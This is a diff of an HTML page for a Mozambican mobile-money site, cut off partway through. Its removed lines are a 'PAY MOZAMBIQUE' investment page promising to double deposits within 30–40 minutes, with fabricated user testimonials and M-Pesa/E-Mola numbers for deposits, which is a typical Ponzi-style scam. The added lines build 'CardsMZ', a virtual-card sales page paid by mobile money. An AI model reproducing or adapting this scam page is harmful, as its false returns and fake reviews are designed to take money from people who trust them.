@@ -1,338 +1,503 @@
 <!DOCTYPE html>
 <html lang="pt">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PAY MOZAMBIQUE 🇲🇿</title>
-    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-    <style>
-        :root {
-            --primary: #00ffcc;
-            --success: #28a745;
-            --danger: #dc3545;
-            --card-bg: rgba(255, 255, 255, 0.08);
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CardsMZ - Cartões Virtuais</title>
+<meta name="description" content="Adquira cartões bancários virtuais de forma rápida e segura. Recarregue via M-PESA ou E-MOLA.">
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=DM+Sans:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+--bg:220 20% 7%;--fg:35 30% 93%;--card:220 18% 13%;--card-fg:35 30% 93%;
+--primary:168 70% 45%;--primary-fg:220 20% 7%;--secondary:42 80% 55%;--secondary-fg:220 20% 7%;
+--muted:220 15% 16%;--muted-fg:210 15% 50%;--border:220 15% 22%;--destructive:0 84% 60%;
+--radius:0.75rem;
+}
+body{background:hsl(var(--bg));color:hsl(var(--fg));font-family:'DM Sans',sans-serif;-webkit-font-smoothing:antialiased;line-height:1.6}
+h1,h2,h3,h4,h5,h6,.font-heading{font-family:'Space Grotesk',sans-serif}
+.gradient-text{background:linear-gradient(135deg,hsl(var(--primary)),hsl(var(--secondary)));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.container{max-width:1200px;margin:0 auto;padding:0 1rem}
+a{color:inherit;text-decoration:none}
 
-        body {
-            margin: 0; font-family: 'Segoe UI', sans-serif;
-            background: #0a0a0a; color: white; padding-bottom: 80px;
-        }
+/* Buttons */
+.btn{display:inline-flex;align-items:center;justify-content:center;gap:.5rem;padding:.625rem 1.5rem;border-radius:var(--radius);font-family:'Space Grotesk',sans-serif;font-weight:600;font-size:.875rem;cursor:pointer;border:none;transition:all .2s}
+.btn-hero{background:hsl(var(--primary));color:hsl(var(--primary-fg));box-shadow:0 4px 15px hsla(var(--primary)/.2)}
+.btn-hero:hover{filter:brightness(1.1)}
+.btn-outline{border:1px solid hsl(var(--primary));color:hsl(var(--primary));background:transparent}
+.btn-outline:hover{background:hsla(var(--primary)/.1)}
+.btn-gold{background:linear-gradient(135deg,hsl(var(--secondary)),hsl(15 80% 50%));color:hsl(var(--secondary-fg))}
+.btn-gold:hover{filter:brightness(1.1)}
+.btn-whatsapp{background:hsl(var(--primary));color:hsl(var(--primary-fg));box-shadow:0 4px 10px hsla(var(--primary)/.15)}
+.btn-whatsapp:hover{filter:brightness(1.1)}
+.btn-back{border:1px solid hsl(var(--border));color:hsl(var(--muted-fg));background:transparent}
+.btn-back:hover{background:hsla(var(--muted)/.5)}
+.btn-full{width:100%}
 
-        .container { padding: 15px; max-width: 480px; margin: auto; }
-        .hidden { display: none; }
+/* Card component */
+.vcard{position:relative;width:100%;max-width:380px;border-radius:1rem;overflow:hidden;margin:0 auto;color:#f5f0e8;aspect-ratio:1.586/1}
+.vcard-inner{position:relative;z-index:2;display:flex;flex-direction:column;justify-content:space-between;height:100%;padding:1.25rem}
+.vcard .shine{position:absolute;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,.15),transparent)}
+.vcard .shine-top{top:0}.vcard .shine-bot{bottom:0}
+.vcard .holo{position:absolute;inset:0;opacity:.07;background:repeating-linear-gradient(105deg,transparent,transparent 10px,rgba(255,255,255,.08) 10px,rgba(255,255,255,.08) 20px)}
+.vcard .glow{position:absolute;width:180px;height:180px;border-radius:50%;filter:blur(60px)}
+.vcard .glow1{top:-60px;right:-60px}.vcard .glow2{bottom:-60px;left:-60px}
+.vcard-brand{font-family:'Space Grotesk',sans-serif;font-size:11px;font-weight:600;letter-spacing:.3em;text-transform:uppercase;opacity:.9}
+.vcard-sub{font-size:9px;letter-spacing:.2em;text-transform:uppercase;opacity:.4;margin-top:2px}
+.vcard-chip{width:48px;height:34px;border-radius:6px;box-shadow:inset 0 1px 2px rgba(255,255,255,.4),inset 0 -1px 2px rgba(0,0,0,.2),0 2px 4px rgba(0,0,0,.3)}
+.vcard-number{font-family:'Space Grotesk',sans-serif;font-size:clamp(15px,3.5vw,19px);letter-spacing:.22em;font-weight:500;text-shadow:0 1px 2px rgba(0,0,0,.3)}
+.vcard-bottom{display:flex;align-items:flex-end;justify-content:space-between}
+.vcard-label{font-size:7px;letter-spacing:.2em;text-transform:uppercase;opacity:.4;margin-bottom:2px}
+.vcard-value{font-family:'Space Grotesk',sans-serif;font-size:clamp(10px,2.2vw,12px);font-weight:600;letter-spacing:.08em;text-shadow:0 1px 2px rgba(0,0,0,.3)}
+.vcard-circles{display:flex;margin-left:.5rem}
+.vcard-circles span{width:26px;height:26px;border-radius:50%}
+.vcard-circles span:last-child{margin-left:-8px}
+.floating{animation:cardFloat 3s ease-in-out infinite}
 
-        /* NOTIFICAÇÕES */
-        #notify-bar {
-            position: fixed; top: 10px; left: 50%; transform: translateX(-50%);
-            background: var(--primary); color: #000; padding: 10px 20px;
-            border-radius: 25px; font-size: 12px; font-weight: bold; z-index: 1000;
-            box-shadow: 0 4px 15px rgba(0,255,204,0.3); transition: 0.5s;
-        }
+/* Hero */
+.hero{position:relative;min-height:100vh;display:flex;align-items:center;overflow:hidden}
+.hero-grid{display:grid;grid-template-columns:1fr;gap:3rem;align-items:center;padding:5rem 0}
+@media(min-width:768px){.hero-grid{grid-template-columns:1fr 1fr}}
+.hero-badge{display:inline-flex;align-items:center;gap:.5rem;border:1px solid hsla(var(--primary)/.3);background:hsla(var(--primary)/.1);border-radius:9999px;padding:.375rem 1rem;font-size:.875rem;color:hsl(var(--primary))}
+.hero h1{font-size:clamp(2rem,5vw,3.5rem);font-weight:700;line-height:1.15}
+.hero p{color:hsl(var(--muted-fg));font-size:1.125rem;max-width:480px;line-height:1.7}
+.hero-features{display:flex;flex-wrap:wrap;gap:1.5rem;font-size:.875rem;color:hsl(var(--muted-fg))}
+.hero-features span{display:flex;align-items:center;gap:.375rem}
+.hero-glow{position:absolute;border-radius:50%;pointer-events:none}
 
-        .header { text-align: center; padding: 25px 0; border-bottom: 1px solid #222; }
-        .logo { font-size: 22px; font-weight: 900; color: var(--primary); }
+/* Sections */
+section{padding:5rem 0}
+.section-title{text-align:center;margin-bottom:3rem}
+.section-title h2{font-size:clamp(1.6rem,4vw,2.8rem);font-weight:700}
+.section-title p{color:hsl(var(--muted-fg));margin-top:.75rem;max-width:500px;margin-left:auto;margin-right:auto}
 
-        .card {
-            background: var(--card-bg); backdrop-filter: blur(10px);
-            padding: 20px; margin-top: 15px; border-radius: 15px;
-            border: 1px solid rgba(255,255,255,0.1);
-        }
+/* Card tiers */
+.tier{display:flex;flex-direction:column;gap:1.5rem}
+.tier-info{position:relative;border:1px solid hsl(var(--border));border-radius:1rem;padding:1.5rem;background:hsl(var(--card))}
+.tier-info.popular{border:1px solid transparent;background:linear-gradient(hsl(var(--card)),hsl(var(--card))) padding-box,linear-gradient(135deg,hsl(var(--primary)),hsl(var(--secondary))) border-box;box-shadow:0 0 40px hsla(168,70%,45%,.12)}
+.tier-info.vip{border:1px solid transparent;background:linear-gradient(hsl(var(--card)),hsl(var(--card))) padding-box,linear-gradient(135deg,hsl(var(--secondary)),hsl(15,80%,50%)) border-box;box-shadow:0 0 40px hsla(42,80%,55%,.12)}
+.tier-tag{position:absolute;top:-.75rem;left:50%;transform:translateX(-50%);font-size:.75rem;font-weight:600;padding:.25rem 1rem;border-radius:9999px}
+.tier-tag.popular{background:hsl(var(--primary));color:hsl(var(--primary-fg))}
+.tier-tag.vip{background:hsl(var(--secondary));color:hsl(var(--secondary-fg))}
+.tier-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:1rem}
+.tier-price{font-size:1.875rem;font-weight:700}
+.tier-grid{display:grid;grid-template-columns:1fr;gap:1rem}
+@media(min-width:640px){.tier-grid{grid-template-columns:1fr 1fr}}
+.tier-grid ul{list-style:none;display:flex;flex-direction:column;gap:.5rem}
+.tier-grid li{display:flex;align-items:center;gap:.5rem;font-size:.875rem}
+.tier-grid li svg{color:hsl(var(--primary));flex-shrink:0}
+.tier-label{font-size:.7rem;text-transform:uppercase;letter-spacing:.15em;color:hsl(var(--muted-fg));font-weight:600;margin-bottom:.5rem}
 
-        input, select, textarea {
-            width: 100%; padding: 14px; margin-top: 10px; border-radius: 8px;
-            border: 1px solid #333; background: #000; color: white; box-sizing: border-box;
-        }
+/* How it works */
+.how-bg{background:hsl(220 20% 6%)}
+.steps-grid{display:grid;grid-template-columns:1fr 1fr;gap:2rem;max-width:900px;margin:0 auto}
+@media(min-width:768px){.steps-grid{grid-template-columns:repeat(4,1fr)}}
+.step{text-align:center;position:relative}
+.step-icon{width:60px;height:60px;margin:0 auto;border-radius:14px;background:hsl(var(--card));border:1px solid hsl(var(--border));display:flex;align-items:center;justify-content:center}
+.step-icon svg{width:24px;height:24px;color:hsl(var(--primary))}
+.step-num{position:absolute;top:-8px;right:calc(50% - 38px);width:24px;height:24px;border-radius:50%;background:hsl(var(--secondary));color:hsl(var(--secondary-fg));font-size:11px;font-weight:700;display:flex;align-items:center;justify-content:center}
+.step h3{font-weight:600;margin-top:1rem}
+.step p{font-size:.875rem;color:hsl(var(--muted-fg));margin-top:.5rem}
 
-        button {
-            width: 100%; padding: 15px; margin-top: 15px; border-radius: 8px;
-            border: none; font-weight: bold; cursor: pointer; text-transform: uppercase;
-        }
+/* Payment */
+.pay-card{background:hsl(var(--card));border:1px solid hsl(var(--border));border-radius:1rem;padding:1.5rem}
+.pay-method{display:flex;align-items:center;justify-content:space-between;background:hsl(var(--card));border:1px solid hsl(var(--border));border-radius:1rem;padding:1.25rem}
+.pay-method-icon{width:44px;height:44px;border-radius:.75rem;display:flex;align-items:center;justify-content:center;font-size:1.25rem}
+.copy-btn{display:flex;align-items:center;gap:.375rem;background:hsl(var(--muted));padding:.5rem .75rem;border-radius:.5rem;font-size:.875rem;border:none;color:hsl(var(--fg));cursor:pointer;transition:background .2s}
+.copy-btn:hover{background:hsla(var(--muted)/.7)}
+.code-input{width:100%;background:hsl(var(--muted));border:1px solid hsl(var(--border));border-radius:.5rem;padding:.75rem 1rem;color:hsl(var(--fg));font-family:'Space Grotesk',sans-serif;text-align:center;font-size:1.875rem;letter-spacing:.5em;outline:none;transition:border-color .2s}
+.code-input:focus{border-color:hsl(var(--primary))}
+.phone-input{width:100%;background:hsl(var(--muted));border:1px solid hsl(var(--border));border-radius:.5rem;padding:.75rem 1rem;color:hsl(var(--fg));font-family:'Space Grotesk',sans-serif;outline:none;transition:border-color .2s}
+.phone-input:focus{border-color:hsl(var(--primary))}
+.error-box{display:flex;align-items:flex-start;gap:.5rem;padding:.75rem;border-radius:.5rem;background:hsla(var(--destructive)/.1);border:1px solid hsla(var(--destructive)/.3)}
+.error-box p{font-size:.875rem;color:hsl(var(--destructive))}
+.step-indicator{display:flex;align-items:center;justify-content:center;gap:.5rem;margin-bottom:1rem}
+.step-pill{display:flex;align-items:center;gap:.5rem;padding:.5rem 1rem;border-radius:9999px;font-size:.875rem;font-weight:600;transition:all .2s}
+.step-pill.active{background:hsl(var(--primary));color:hsl(var(--primary-fg))}
+.step-pill.inactive{background:hsl(var(--muted));color:hsl(var(--muted-fg))}
+.info-box{background:hsl(var(--card));border:1px solid hsl(var(--border));border-radius:1rem;padding:1.5rem;max-width:700px;margin:0 auto 2rem}
+.info-grid{display:grid;grid-template-columns:1fr;gap:1rem}
+@media(min-width:640px){.info-grid{grid-template-columns:repeat(3,1fr)}}
+.info-step{display:flex;gap:.75rem;align-items:flex-start}
+.info-num{width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-weight:700;font-size:.875rem}
+.methods-grid{display:grid;grid-template-columns:1fr;gap:1rem}
+@media(min-width:640px){.methods-grid{grid-template-columns:1fr 1fr}}
+.method-card{border:1px solid hsl(var(--border));border-radius:.75rem;padding:1rem;background:hsla(var(--muted)/.3)}
+.method-card .steps-list{font-size:.875rem;color:hsl(var(--muted-fg));display:flex;flex-direction:column;gap:.25rem;margin-top:.75rem}
+.notes-box{border-radius:.5rem;padding:1rem;font-size:.875rem;color:hsl(var(--muted-fg));display:flex;flex-direction:column;gap:.375rem;background:hsl(220 20% 8%)}
+.notes-box p{display:flex;align-items:center;gap:.5rem}
 
-        .btn-main { background: var(--primary); color: #000; }
-        .btn-sec { background: transparent; border: 1px solid var(--primary); color: var(--primary); }
+/* Info additional */
+.info-additional{max-width:600px;margin:3rem auto 0;background:hsl(var(--card));border:1px solid hsl(var(--border));border-radius:1rem;padding:1.5rem;text-align:center}
+.info-additional .grid{display:grid;grid-template-columns:1fr 1fr;gap:.75rem;font-size:.875rem;color:hsl(var(--muted-fg));margin-top:1rem}
+.info-additional .grid span{display:flex;align-items:center;gap:.5rem}
 
-        /* COMENTÁRIOS */
-        .comment { border-bottom: 1px solid #222; padding: 10px 0; font-size: 13px; }
-        .comment b { color: var(--primary); }
+/* Footer */
+footer{border-top:1px solid hsl(var(--border));padding:2rem 0}
+footer .inner{display:flex;flex-wrap:wrap;align-items:center;justify-content:space-between;gap:1rem}
+footer p{font-size:.875rem;color:hsl(var(--muted-fg))}
+footer a{font-size:.875rem;color:hsl(var(--muted-fg));display:flex;align-items:center;gap:.375rem;transition:color .2s}
+footer a:hover{color:hsl(var(--primary))}
 
-        nav {
-            position: fixed; bottom: 0; width: 100%; display: flex;
-            background: #000; border-top: 1px solid #222; z-index: 100;
-        }
-        nav button { flex: 1; background: none; font-size: 10px; color: #666; padding: 15px 0; margin:0; }
-        nav button.active { color: var(--primary); border-top: 2px solid var(--primary); }
+.hidden{display:none!important}
+.flex-gap{display:flex;gap:.75rem}
+.text-center{text-align:center}
+.mt-1{margin-top:.25rem}.mt-2{margin-top:.5rem}.mt-4{margin-top:1rem}
+.text-sm{font-size:.875rem}.text-xs{font-size:.75rem}
+.text-muted{color:hsl(var(--muted-fg))}
 
-        .hist-item { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #222; font-size: 12px; }
-        
-        /* TABELA VISÍVEL */
-        .tabela-precos { font-size: 12px; width: 100%; border-collapse: collapse; margin-top: 10px; }
-        .tabela-precos td { padding: 5px; border-bottom: 1px solid #333; }
-        .tabela-precos .retorno { color: var(--primary); font-weight: bold; }
-    </style>
+@keyframes cardFloat{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
+@keyframes fadeInUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+
+/* SVG icons inline */
+.icon{width:16px;height:16px;display:inline-block;vertical-align:middle}
+.icon-lg{width:20px;height:20px}
+.icon-xl{width:24px;height:24px}
+</style>
 </head>
 <body>
 
-<div id="notify-bar" class="hidden"></div>
+<!-- ============ HERO ============ -->
+<section class="hero">
+<div class="hero-glow" style="width:600px;height:600px;top:-200px;left:-200px;opacity:.06;background:radial-gradient(circle,hsl(168 70% 45%),transparent 70%)"></div>
+<div class="hero-glow" style="width:500px;height:500px;bottom:-100px;right:-150px;opacity:.04;background:radial-gradient(circle,hsl(42 80% 55%),transparent 70%)"></div>
+<div class="container">
+<div class="hero-grid" style="animation:fadeInUp .6s ease-out">
+<div style="display:flex;flex-direction:column;gap:1.75rem">
+<div class="hero-badge">
+<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+Cartões Bancários Seguros
+</div>
+<h1>O seu <span class="gradient-text">Cartão Virtual</span> em minutos</h1>
+<p>Adquira o seu cartão bancário virtual de forma rápida e segura. Recarregue via M-PESA ou E-MOLA e comece a usar imediatamente.</p>
+<div class="hero-features">
+<span><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="hsl(42 80% 55%)" stroke-width="2"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>Entrega Instantânea</span>
+<span><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="hsl(42 80% 55%)" stroke-width="2" stroke-linecap="round"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>Visa & Mastercard</span>
+<span><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="hsl(42 80% 55%)" stroke-width="2" stroke-linecap="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>100% Seguro</span>
+</div>
+<div><a href="#cartoes" class="btn btn-hero" style="font-size:1rem;padding:.75rem 2rem">Ver Cartões Disponíveis</a></div>
+</div>
+<div style="display:flex;justify-content:center;animation:fadeInUp .8s ease-out">
+<div class="vcard floating" style="background:linear-gradient(135deg,hsl(210 80% 30%),hsl(220 70% 22%),hsl(230 50% 15%));box-shadow:0 25px 60px -15px rgba(0,0,0,.6),0 0 40px hsla(210,80%,45%,0.2),inset 0 1px 0 rgba(255,255,255,.1)">
+<div class="shine shine-top"></div><div class="shine shine-bot"></div><div class="holo"></div>
+<div class="glow glow1" style="background:hsla(210,80%,50%,0.2)"></div>
+<div class="glow glow2" style="background:hsla(230,60%,40%,0.1)"></div>
+<div class="vcard-inner">
+<div style="display:flex;justify-content:space-between;align-items:flex-start"><div><div class="vcard-brand">CardsMZ</div><div class="vcard-sub">Virtual Prepaid</div></div></div>
+<div class="vcard-chip" style="background:linear-gradient(145deg,hsl(42 85% 68%),hsl(42 65% 50%),hsl(42 70% 42%))"></div>
+<div class="vcard-number">4821 •••• •••• 3047</div>
+<div class="vcard-bottom"><div><div class="vcard-label">Titular</div><div class="vcard-value">ANTONIO M. SILVA</div></div><div style="text-align:center;padding:0 1rem"><div class="vcard-label">Validade</div><div class="vcard-value">09/28</div></div><div class="vcard-circles"><span style="background:hsla(210,80%,55%,0.85)"></span><span style="background:hsla(230,60%,45%,0.7)"></span></div></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</section>
 
-<div class="header">
-    <div class="logo">PAY MOZAMBIQUE 🇲🇿</div>
+<!-- ============ CARD TIERS ============ -->
+<section id="cartoes">
+<div class="container">
+<div class="section-title">
+<h2>Escolha o seu <span class="gradient-text">Cartão</span></h2>
+<p>Três planos para atender às suas necessidades de pagamento online.</p>
+</div>
+<div style="max-width:900px;margin:0 auto;display:flex;flex-direction:column;gap:2.5rem">
+
+<!-- Basic -->
+<div class="tier">
+<div class="vcard" style="background:linear-gradient(135deg,hsl(210 80% 30%),hsl(220 70% 22%),hsl(230 50% 15%));box-shadow:0 25px 60px -15px rgba(0,0,0,.6),0 0 40px hsla(210,80%,45%,0.2),inset 0 1px 0 rgba(255,255,255,.1)">
+<div class="shine shine-top"></div><div class="shine shine-bot"></div><div class="holo"></div>
+<div class="glow glow1" style="background:hsla(210,80%,50%,0.2)"></div><div class="glow glow2" style="background:hsla(230,60%,40%,0.1)"></div>
+<div class="vcard-inner"><div style="display:flex;justify-content:space-between;align-items:flex-start"><div><div class="vcard-brand">CardsMZ</div><div class="vcard-sub">Iniciante</div></div></div><div class="vcard-chip" style="background:linear-gradient(145deg,hsl(42 85% 68%),hsl(42 65% 50%),hsl(42 70% 42%))"></div><div class="vcard-number">4821 •••• •••• 1023</div><div class="vcard-bottom"><div><div class="vcard-label">Titular</div><div class="vcard-value">CARLOS MENDES</div></div><div style="text-align:center;padding:0 1rem"><div class="vcard-label">Validade</div><div class="vcard-value">03/27</div></div><div class="vcard-circles"><span style="background:hsla(210,80%,55%,0.85)"></span><span style="background:hsla(230,60%,45%,0.7)"></span></div></div></div>
+</div>
+<div class="tier-info">
+<div class="tier-header"><div><h3 class="font-heading" style="font-size:1.25rem;font-weight:700">Cartão Básico</h3><p class="text-sm text-muted">Iniciante</p></div><div><span class="gradient-text tier-price font-heading">199</span><span class="text-sm text-muted"> MZN</span></div></div>
+<div class="tier-grid"><div><p class="tier-label">Características</p><ul><li><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>Recarga mínima de 200 MZN</li><li><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>Taxa manutenção: 0,5%/mês</li><li><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>Limite de gastos: 2.000 MZN</li></ul></div><div><p class="tier-label">Vantagens</p><ul><li><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>Fácil de obter</li><li><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>Sem requisitos de renda</li><li><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>Ideal para gastos diários</li></ul></div></div>
+<button class="btn btn-outline btn-full mt-4" onclick="selectCard('Cartão Básico - 199 MZN')">Comprar</button>
+</div>
 </div>
 
-<div id="loginPage" class="container">
-    <div class="card">
-        <h3>ACESSAR TERMINAL</h3>
-        <input id="email" type="email" placeholder="E-mail">
-        <input id="senha" type="password" placeholder="PIN de Segurança">
-        <button class="btn-main" onclick="register()">CRIAR CONTA GRATUITA</button>
-        <button class="btn-sec" onclick="login()">ENTRAR</button>
-    </div>
+<!-- Premium -->
+<div class="tier">
+<div class="vcard" style="background:linear-gradient(135deg,hsl(0 0% 12%),hsl(0 0% 6%),hsl(0 0% 2%));box-shadow:0 25px 60px -15px rgba(0,0,0,.8),0 0 50px rgba(255,255,255,.05),inset 0 1px 0 rgba(255,255,255,.08)">
+<div class="shine shine-top"></div><div class="shine shine-bot"></div><div class="holo"></div>
+<div class="glow glow1" style="background:rgba(255,255,255,.06)"></div><div class="glow glow2" style="background:hsla(168,70%,45%,0.08)"></div>
+<div class="vcard-inner"><div style="display:flex;justify-content:space-between;align-items:flex-start"><div><div class="vcard-brand">CardsMZ</div><div class="vcard-sub">Intermediário</div></div></div><div class="vcard-chip" style="background:linear-gradient(145deg,hsl(0 0% 70%),hsl(0 0% 50%),hsl(0 0% 40%))"></div><div class="vcard-number">5392 •••• •••• 7814</div><div class="vcard-bottom"><div><div class="vcard-label">Titular</div><div class="vcard-value">MARIA JOSE</div></div><div style="text-align:center;padding:0 1rem"><div class="vcard-label">Validade</div><div class="vcard-value">11/28</div></div><div class="vcard-circles"><span style="background:rgba(255,255,255,0.7)"></span><span style="background:hsla(168,70%,45%,0.6)"></span></div></div></div>
+</div>
+<div class="tier-info popular">
+<div class="tier-tag popular">Mais Popular</div>
+<div class="tier-header"><div><h3 class="font-heading" style="font-size:1.25rem;font-weight:700">Cartão Premium</h3><p class="text-sm text-muted">Intermediário</p></div><div><span class="gradient-text tier-price font-heading">350</span><span class="text-sm text-muted"> MZN</span></div></div>
+<div class="tier-grid"><div><p class="tier-label">Características</p><ul><li><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>Recarga mínima de 500 MZN</li><li><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>Taxa manutenção: 0,5%/mês</li><li><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>Limite de gastos: 10.000 MZN</li></ul></div><div><p class="tier-label">Vantagens</p><ul><li><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>Maior limite de gastos</li><li><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>Serviços internacionais</li><li><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>Recompensas por gastos</li></ul></div></div>
+<button class="btn btn-hero btn-full mt-4" onclick="selectCard('Cartão Premium - 350 MZN')">Comprar</button>
+</div>
 </div>
 
-<div id="app" class="hidden">
-    
-    <div id="home" class="container section">
-        <div class="card">
-            <small style="color:#aaa">SALDO DISPONÍVEL</small>
-            <h2 style="margin:5px 0"><span id="valSaldo">0.00</span> MZN</h2>
-            <p id="msgMineracao" style="font-size: 10px; color: var(--primary); margin: 0;"></p>
-        </div>
-
-        <div class="card">
-            <h4>TABELA DE RENDIMENTOS</h4>
-            <table class="tabela-precos">
-                <tr><td>55 MT</td><td class="retorno">➜ 100 MT (BÓNUS ÚNICO)</td></tr>
-                <tr><td>120 MT</td><td class="retorno">➜ 250 MT</td></tr>
-                <tr><td>300 MT</td><td class="retorno">➜ 800 MT</td></tr>
-                <tr><td>1.000 MT</td><td class="retorno">➜ 2.000 MT</td></tr>
-                <tr><td>5.000 MT</td><td class="retorno">➜ 10.000 MT</td></tr>
-                <tr><td>10.000 MT</td><td class="retorno">➜ 20.000 MT</td></tr>
-            </table>
-            <p style="font-size: 10px; color: #888; margin-top: 10px;">* O retorno é adicionado em 30 a 40 minutos.</p>
-        </div>
-
-        <div class="card">
-            <h4>FEEDBACK DA COMUNIDADE</h4>
-            <div id="boxComentarios" style="max-height: 200px; overflow-y: auto;">
-                <div class="comment"><b>Admin_Pay</b>: ⚠️ Oferta de 55MT disponível apenas para o primeiro investimento!</div>
-                <div class="comment"><b>lucas_invest</b>: Coloquei 1000MT e em 35 min caiu 2000MT. Top!</div>
-                <div class="comment"><b>marta_moza</b>: Fiz meu 2º levantamento de hoje. Limite diário atingido! ✅</div>
-                <div class="comment"><b>zelio_invest</b>: Os 800MT do investimento de 300MT já estão na conta.</div>
-            </div>
-            <input id="meuComentario" placeholder="Escreva sua experiência...">
-            <button class="btn-main" style="padding:8px" onclick="addComentario()">PUBLICAR</button>
-        </div>
-    </div>
-
-    <div id="investir" class="hidden container section">
-        <h3>DEPOSITAR CAPITAL</h3>
-        <div class="card">
-            <p style="font-size: 12px; color: var(--primary);">Mínimo: 55 MT | Máximo: 10.000 MT</p>
-            <input id="depValor" type="number" placeholder="Valor do Investimento">
-            <select id="depMetodo">
-                <option value="M-Pesa">M-Pesa (845646041)</option>
-                <option value="E-Mola">E-Mola (876353251)</option>
-            </select>
-            <button class="btn-main" onclick="gerarPagamento()">OBTER DADOS DE PAGAMENTO</button>
-        </div>
-
-        <div id="areaConfirmacao" class="card hidden">
-            <p id="txtInstrucao" style="font-size: 12px; line-height: 1.5;"></p>
-            <textarea id="idTransacao" placeholder="Cole aqui a mensagem de confirmação ou ID da Transação"></textarea>
-            <button class="btn-main" style="background: var(--success)" onclick="confirmar()">ENVIAR COMPROVATIVO</button>
-        </div>
-    </div>
-
-    <div id="saque" class="hidden container section">
-        <h3>SOLICITAR RETIRADA</h3>
-        <div class="card">
-            <input id="sacarValor" type="number" placeholder="Valor MZN">
-            <input type="text" placeholder="Número da Conta (M-Pesa/Emola)">
-            <p style="font-size: 11px; color: #888;">
-                * Limite: <b>2 levantamentos por dia</b><br>
-                * Processamento: <b>30-40 Minutos</b>
-            </p>
-            <button class="btn-main" onclick="processarSaque()">SACAR AGORA</button>
-        </div>
-    </div>
-
-    <div id="historico" class="hidden container section">
-        <h3>EXTRATO COMPLETO</h3>
-        <div id="listaHistorico"></div>
-    </div>
+<!-- VIP -->
+<div class="tier">
+<div class="vcard" style="background:linear-gradient(135deg,hsl(38 80% 42%),hsl(28 70% 32%),hsl(18 50% 20%));box-shadow:0 25px 60px -15px rgba(0,0,0,.6),0 0 50px hsla(38,80%,50%,0.2),inset 0 1px 0 rgba(255,255,255,.15)">
+<div class="sihine shine-top"></div><div class="shine shine-bot"></div><div class="holo"></div>
+<div class="glow glow1" style="background:hsla(38,80%,55%,0.25)"></div><div class="glow glow2" style="background:hsla(18,60%,40%,0.15)"></div>
+<div class="vcard-inner"><div style="display:flex;justify-content:space-between;align-items:flex-start"><div><div class="vcard-brand">CardsMZ</div><div class="vcard-sub">Premium Exclusivo</div></div></div><div class="vcard-chip" style="background:linear-gradient(145deg,hsl(42 90% 72%),hsl(38 80% 55%),hsl(35 70% 40%))"></div><div class="vcard-number">4156 •••• •••• 9201</div><div class="vcard-bottom"><div><div class="vcard-label">Titular</div><div class="vcard-value">JOAO MACHADO</div></div><div style="text-align:center;padding:0 1rem"><div class="vcard-label">Validade</div><div class="vcard-value">06/29</div></div><div class="vcard-circles"><span style="background:hsla(42,80%,55%,0.9)"></span><span style="background:hsla(28,70%,45%,0.8)"></span></div></div></div>
+</div>
+<div class="tier-info vip">
+<div class="tier-tag vip">Exclusivo</div>
+<div class="tier-header"><div><h3 class="font-heading" style="font-size:1.25rem;font-weight:700">Cartão VIP</h3><p class="text-sm text-muted">Premium Exclusivo</p></div><div><span class="gradient-text tier-price font-heading">1.500</span><span class="text-sm text-muted"> MZN</span></div></div>
